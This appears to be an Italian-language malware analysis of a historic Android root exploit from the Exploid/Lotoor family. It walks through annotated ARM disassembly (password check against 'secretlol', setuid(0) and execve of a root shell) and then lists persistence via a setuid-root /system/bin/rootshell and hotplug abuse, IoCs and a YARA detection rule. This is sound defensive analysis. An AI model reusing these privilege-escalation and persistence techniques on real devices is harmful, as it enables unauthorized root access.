+0x00008cc4 bl sym.imp.memset ; void *memset(void *s, int c, size_t n)
+
+;setta a zero 0x80 byte del buffer buf.
+
+0x00008cc8 sub r3, buf
+
+;ricorre spessissimo prima delle chiamate (memset, readlink, read, strlen, ecc.).
+;in realtà non è una vera subtraction, è l'idioma di compilazione ARM/thumb con fp o sp per calcolare l'indirizzo relativo della variabile locale buf.
+;quindi ogni volta che vedi sub r3, buf, in pratica significa "metti in r3 l'indirizzo della variabile buf".
+
+0x00008ccc ldr r2, [0x00008e2c] ; [0x8e2c:4]=0xfffff2e8
+0x00008cd0 add r2, r4, r2 ; 0x93d8 ; "/proc/self/fd/0"
+
+;in pratica qui il binario ha le stringhe "reloc-relative": r4 è la base del segmento dati, e con quell'offset arriva al puntatore della stringa.
+
+0x00008cd4 mov r0, r2 ; 0x93d8 ; "/proc/self/fd/0"
+0x00008cd8 mov r1, r3
+0x00008cdc mov r2, 0x80
+0x00008ce0 bl sym.imp.readlink
+
+;readlink("/proc/self/fd/0", buf, 128);
+
+;/proc/self/fd/0 è il file descriptor 0 del processo corrente, cioè lo stdin.
+;/proc/self/fd/0 è un symlink al file (o terminale, o pipe) a cui è collegato lo standard input.
+
+;questa chiamata serve a capire da dove arriva lo stdin del processo.
+
+;se lanci il programma da terminale --> il link punta a /dev/pts/X.
+;se lo esegui facendo ./bin < input.txt --> il link punta a input.txt.
+;se riceve input da pipe --> mostra "pipe:[XXXX]"
+
+char buf[128];
+readlink("/proc/self/fd/0", buf, 128);
+
+;buf ora contiene il path effettivo a cui è legato lo stdin.
+
+0x00008ce4 sub r3, buf
+0x00008ce8 mov r0, r3 ; const char *s1
+0x00008cec ldr r3, [0x00008e30] ; [0x8e30:4]=0xfffff2f8
+0x00008cf0 add r3, r4, r3 ; 0x93e8 ; "/dev/pts/"
+0x00008cf4 mov r1, r3 ; 0x93e8 ; "/dev/pts/" ; const char *s2
+0x00008cf8 mov r2, 9
+0x00008cfc bl sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
+
+strncmp(buf, "/dev/pts/", 9);
+
+;quindi confronta i primi 9 caratteri.
+;il risultato sarà:
+;0 --> se stdin è /dev/pts/... (quindi da un terminale interattivo).
+;!=0 --> se stdin non è un terminale (file, pipe, ecc.).
+
+0x00008d00 mov r3, r0
+0x00008d04 cmp r3, 0
+0x00008d08 beq 0x8d1c
+
+0x00008d0c ldr r3, [0x00008e34] ; [0x8e34:4]=0xfffff308
+0x00008d10 add r3, r4, r3 ; 0x93f8 ; "[-] memory tricks"
+0x00008d14 mov r0, r3 ; 0x93f8 ; "[-] memory tricks" ; int32_t arg1
+0x00008d18 bl sym.die
+
+;qui viene chiamata una chiamata che fa l'abort ed esce.
+
+0x00008d1c mov r0, 1 ; int fd
+0x00008d20 ldr r3, [0x00008e38] ; [0x8e38:4]=0xfffff320
+0x00008d24 add r3, r4, r3 ; 0x9410 ; "Password (echoed):"
+0x00008d28 mov r1, r3 ; 0x9410 ; "Password (echoed):" ; const char *ptr
+0x00008d2c mov r2, 0x12
+0x00008d30 bl sym.imp.write ; ssize_t write(int fd, const char *ptr, size_t nbytes)
+
+;sullo stdout (fd=1) scrive la stringa "Password (echoed)".
+
+0x00008d34 sub r3, buf
+0x00008d38 mov r0, r3 ; void *s
+0x00008d3c mov r1, 0 ; int c
+0x00008d40 mov r2, 0x80
+0x00008d44 bl sym.imp.memset ; void *memset(void *s, int c, size_t n)
+
+;di nuovo il buf inizializzato per 128 byte a zero.
+
+0x00008d48 sub r3, buf
+0x00008d4c mov r0, 0 ; int fildes
+0x00008d50 mov r1, r3 ; void *buf
+0x00008d54 mov r2, 0x7f ; '\x7f'
+0x00008d58 bl sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
+
+;legge byte dallo stdin.
+
+0x00008d5c mov r0, 2 ; int s
+0x00008d60 bl sym.imp.sleep ; int sleep(int s)
+
+;pausa per 2 secondi.
+
+0x00008d64 sub r3, buf
+0x00008d68 mov r0, r3 ; const char *s
+0x00008d6c bl sym.imp.strlen ; size_t strlen(const char *s)
+
+;calcola la lunghezza della stringa letta.
+
+0x00008d70 mov r3, r0
+0x00008d74 cmp r3, 5 ; 5
+0x00008d78 bhi 0x8d8c
+
+;branch if higher (unsigned >), salta e continua se la password immessa è maggiore di 5 caratteri.
+
+0x00008d7c ldr r3, [0x00008e3c] ; [0x8e3c:4]=0xfffff338
+0x00008d80 add r3, r4, r3 ; 0x9428 ; "[-] password too short"
+0x00008d84 mov r0, r3 ; 0x9428 ; "[-] password too short" ; int32_t arg1
+0x00008d88 bl sym.die
+
+;procedura di abort ed exit.
+
+0x00008d8c sub r3, buf
+0x00008d90 mov r0, r3 ; const void *s1
+0x00008d94 ldr r3, [0x00008e40] ; [0x8e40:4]=0xfffff350
+0x00008d98 add r3, r4, r3 ; 0x9440 ; "secretlol"
+0x00008d9c mov r1, r3 ; 0x9440 ; "secretlol" ; const void *s2
+0x00008da0 mov r2, 9
+0x00008da4 bl sym.imp.memcmp ; int memcmp(const void *s1, const void *s2, size_t n)
+
+;c'è una comparazione tra la password immessa e la stringa "secretlol".
+
+0x00008da8 mov r3, r0
+0x00008dac cmp r3, 0
+0x00008db0 beq 0x8dc4
+
+0x00008db4 ldr r3, [0x00008e44] ; [0x8e44:4]=0xfffff360
+0x00008db8 add r3, r4, r3 ; 0x9450 ; "[-] wrong password"
+0x00008dbc mov r0, r3 ; 0x9450 ; "[-] wrong password" ; int32_t arg1
+0x00008dc0 bl sym.die
+
+;se non sono uguali va all'exit.
+
+0x00008dc4 mov r0, 0
+0x00008dc8 bl sym.imp.setuid
+
+0x00008dcc mov r0, 0
+0x00008dd0 bl sym.imp.setgid
+
+0x00008dd4 ldr r2, [var_98h] ; 0x98 ; 152
+0x00008dd8 sub r3, var_sp_98h
+0x00008ddc mov r0, r2
+0x00008de0 mov r1, r3
+0x00008de4 ldr r2, [var_a0h] ; 0xa0 ; 160
+0x00008de8 bl sym.imp.execve
+
+;esegue la shell con i privilegi di root.
+
+0x00008dec ldr r3, [0x00008e48] ; [0x8e48:4]=0xfffff378
+0x00008df0 add r3, r4, r3 ; 0x9468 ; "[-] execve"
+0x00008df4 mov r0, r3 ; 0x9468 ; "[-] execve" ; int32_t arg1
+0x00008df8 bl sym.die
+
+;execve non ritorna mai, se ritorna, vuol dire che c'è stato un errore (es. file non trovato, permessi). In quel caso stampa "[-] execve" e fa l'abort.
+
+0x00008dfc ldr r3, [0x00008e24] ; [0x8e24:4]=144
+0x00008e00 ldr r3, [r4, r3] ; 0xa180
+; reloc.__stack_chk_guard
+0x00008e04 ldr r2, [var_10h] ; 0x10 ; 16
+0x00008e08 ldr r3, [r3]
+0x00008e0c cmp r2, r3
+0x00008e10 beq 0x8e18
+0x00008e14 bl sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+
+0x00008e18 sub sp, var_8h_2
+0x00008e1c pop {r4, fp, pc}
+
+;check canary ed uscita.
+
+-----------------------------------------------------------------------------
+
+;conclusione
+
+;questo binario è un exploit Android di vecchia generazione, derivato dal noto "Exploid" della crew Android Exploid Crew, modificato da birdman per funzionare su determinati dispositivi (es. Motorola DroidX).
+
+;il comportamento mostra chiaramente tre obiettivi principali:
+;escalation di privilegi --> sfruttando la logica setuid-root, l'exploit concede shell root anche a utenti non privilegiati.
+;persistenza --> copia se stesso in /system/bin/rootshell, marcandolo setuid-root e garantendo sopravvivenza ai reboot.
+;autoinvocazione --> sfrutta socket netlink e file hotplug per agganciarsi al kernel e mantenere un canale di attivazione automatica.
+
+;osservazioni finali
+
+;questo tipo di malware/exploit non è più efficace sulle versioni moderne di Android, dove il filesystem /system è verificato (dm-verity, è un meccanismo del kernel Linux (usato da Android) per garantire che una partizione montata sia read-only e verificabile tramite hash), i meccanismi di hotplug sono stati modificati, e SELinux in enforcing mode blocca simili tentativi.
+
+;tuttavia, ai tempi era uno strumento potente per il rooting e venne ampiamente usato in ambito jailbreak/rooting, più che in contesti strettamente malevoli.
+
+;dal punto di vista della sicurezza, questo campione rappresenta un esempio classico di come un exploit locale possa:
+
+;sfruttare UID ed eUID per bypassare restrizioni,
+;manipolare il filesystem di sistema,
+;instaurare persistenza tramite componenti del kernel.
+
+;in sintesi, VirusShare_37040d1a0203c101a9dbd70eb6d0efa4 non è un "virus" in senso tradizionale, ma un exploit-rootkit Android storico, nato per ottenere root sui dispositivi dell'epoca e poi riadattato.
+
+-----------------------------------------------------------------------------
+
+;Indicators of Compromise (IoCs)
+
+;file hashes:
+
+MD5: 37040d1a0203c101a9dbd70eb6d0efa4
+
+;file paths:
+
+/system/bin/rootshell
+
+;file temporanei creati:
+
+/sqlite_stmt_journals/loading
+/sqlite_stmt_journals/hotplug
+/data/local/tmp/loading
+/data/local/tmp/hotplug
+
+;symlink creati:
+
+data -> /proc/sys/kernel/hotplug
+
+;stringhe caratteristiche:
+
+"[*] Android local root exploid (C) The Android Exploid Crew"
+"[*] Modified by birdman for the DroidX"
+"Password (echoed):"
+"secretlol"
+"[-] memory tricks"
+"[-] password too short"
+"[-] wrong password"
+"/system/bin/sh"
+"/proc/self/exe"
+"/proc/sys/kernel/hotplug"
+"/dev/block/mmcblk1p21"
+
+;comportamenti di rete:
+
+;socket NETLINK_KOBJECT_UEVENT (AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)
+;invio di messaggi hotplug simulati al kernel
+
+;comportamenti filesystem
+
+;remount di /system in modalità read-write
+;copia del binario in /system/bin/rootshell
+;chmod 4755 su /system/bin/rootshell (setuid root)
+;scrittura in /proc/sys/kernel/hotplug
+;creazione di file marker (loading, hotplug)
+
+;comportamenti di processo
+
+;controllo eUID == 0 && UID != 0 (setuid-root requirement)
+;chiamate: geteuid(), getuid(), setuid(0), setgid(0)
+;esecuzione di /system/bin/sh con privilegi di root
+
+----------------------------------------------------------------------------
+
+;YARA Rules
+
+rule Android_Lotoor {
+meta:
+description = "Detecta Android Lotoor malware - versione semplificata"
+author = "Security Analyst"
+date = "2024-12-15"
+version = "1.0"
+family = "Android Exploid Lotoor"
+
+strings:
+// Stringhe uniche del malware
+$s1 = "Android local root exploid" ascii
+$s2 = "Modified by birdman for the DroidX" ascii
+$s3 = "secretlol" ascii
+$s4 = "Password (echoed):" ascii
+$s5 = "memory tricks" ascii
+$s6 = "/system/bin/rootshell" ascii
+$s7 = "opening NETLINK_KOBJECT_UEVENT socket" ascii
+$s8 = "Try to invoke hotplug now" ascii
+
+condition:
+// File ELF
+uint32(0) == 0x464c457f and
+
+// Almeno 3 stringhe caratteristiche
+3 of ($s1, $s2, $s3, $s4, $s5, $s6, $s7, $s8)
+}
+
+yara alienandroid.yar VirusShare_37040d1a0203c101a9dbd70eb6d0efa4
+Android_Lotoor VirusShare_37040d1a0203c101a9dbd70eb6d0efa4
+
+-----------------------------------------------------------------------------
+
+<img src="https://upload.forumfree.net/i/bf1354993/AndroidMalware.png" class="full-img">
+
+;molti vendor lo identificano come appartenente alla famiglia Lotoor, che è effettivamente correlata agli exploit Exploid. Lotoor era un tool di rooting molto popolare che utilizzava exploit come Exploid.
+
+;VirusTotal conferma l'analisi tecnica: si tratta di un exploit Android storico della famiglia Exploid/Lotoor, utilizzato per ottenere root sui dispositivi Android dell'epoca (~2010). La detection rate del 47% (30/63) è ragionevole per un campione di questa età, considerando che molti vendor potrebbero non mantenere signature per minacce così datate.
